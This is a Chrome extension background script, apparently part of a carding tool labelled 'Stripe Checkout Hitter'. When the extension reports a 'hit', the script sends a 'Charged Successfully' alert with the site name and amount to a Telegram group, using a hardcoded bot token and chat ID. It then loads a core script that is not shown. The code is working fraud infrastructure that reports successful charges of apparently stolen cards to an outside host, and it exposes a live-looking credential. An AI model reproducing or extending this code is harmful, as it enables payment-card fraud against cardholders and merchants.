/**
 * Nexvora Absolute Isolation (v12.0 - Forced Strip)
 * Zero collision, zero latency, pure stability.
 */

(function() {
    // 1. Absolutely Unique Scope Variables (V12)
    const _NEX_V12_TOKEN_ = '8611283068:AAHACBysrkkm8RqmsidZ24QRwAIcnld4t8o';
    const _NEX_V12_GROUP_ = '-1003721268860';

    chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
        if (request.type === 'NOTIFY_HIT') {
            const { card, amount, gateway, status, site_name } = request.data;
            
            (async () => {
                try {
                    const message = `<b>HIT BDT</b>\n` +
                                    `🚀 <b>HIT SUCCESSFUL</b> ⚡\n` +
                                    `👤 <b>User:</b> 🇧🇩\n` +
                                    `🆙 <b>Plan:</b> <code>SILVER</code>\n` +
                                    `↔️ <b>Gateway:</b> <code>Stripe Checkout Hitter</code>\n` +
                                    `✅ <b>Response:</b> <code>Charged Successfully</code>\n` +
                                    `🌐 <b>Site:</b> <code>${site_name || 'Unknown'}</code>\n` +
                                    `💰 <b>Amount:</b> <code>${amount || 'N/A'}</code>\n\n` +
                                    `<i>Checked by @hitinfobdrobot ✅</i>`;

                    await fetch(`https://api.telegram.org/bot${_NEX_V12_TOKEN_}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: _NEX_V12_GROUP_,
                            text: message,
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [[{ text: "🚀 Open Bot", url: "https://t.me/hitinfobdrobot" }]]
                            }
                        })
                    });
                    sendResponse({ ok: true });
                } catch (err) {
                    sendResponse({ ok: false, error: err.message });
                }
            })();
            return true; 
        }
    });
})();

// 2. Load Core Logic (Forced Restoration Clean)
try {
    importScripts('background_core.js');
} catch (e) {
    console.error("Core Logic Bridge Failed:", e);
}
